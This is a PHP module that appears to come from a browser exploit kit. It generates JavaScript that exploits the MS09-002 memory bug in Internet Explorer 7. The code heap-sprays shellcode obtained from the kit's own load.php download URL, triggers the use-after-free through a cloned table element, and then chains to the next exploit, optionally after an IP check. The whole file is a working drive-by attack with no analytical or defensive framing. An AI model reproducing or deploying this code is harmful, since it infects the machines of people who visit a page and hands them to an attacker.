<?php



if ($UAinfo['browser'] == "MSIE" AND $UAinfo['browser_version'] < 8  AND $UAinfo['browser_version'] > 6){
	$expname = "ms09002";
	$exploits[] = "
	function ms09002(){
		try {
			var shellcode = unescape(\"" . ShellCode::get($config['UrlToFolder'] . "load.php?e=5") . "\");
			var arraydata = new Array();
			var calc = 0x100000-(shellcode.length*2+0x01020);
			var point = unescape(\"%u0C0C%u0C0C\");
			while (point.length < calc/2){
				point+=point;
			}
			var sec = point.substring(0, calc/2);
			delete point;
			for(var i = 0; i < 0xC0; i++){
				arraydata[i] = sec + shellcode;
			}
			CollectGarbage();
			var s1 = unescape(\"%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA\");
			var a1 = new Array();
			for (var x = 0; x < 1000; x++){
				a1.push(document.createElement(\"img\"));
			}
			var o1 = document.createElement('tbody');
			o1.click;
			var o2 = o1.cloneNode();	
			o1.clearAttributes();
			o1 = null;
			CollectGarbage();
			for (var x = 0; x < a1.length; x++){
				a1[x].src = s1;
			}
			o2.click;
		} catch (e) {}
		setTimeout(\"" . ($config['AjaxCheckBeforeExploit'] ? "if (CheckIP()){ Complete(); } else { %NextExploit% }" : "%NextExploit%") . "\", 1000);
	}
	";
}


?>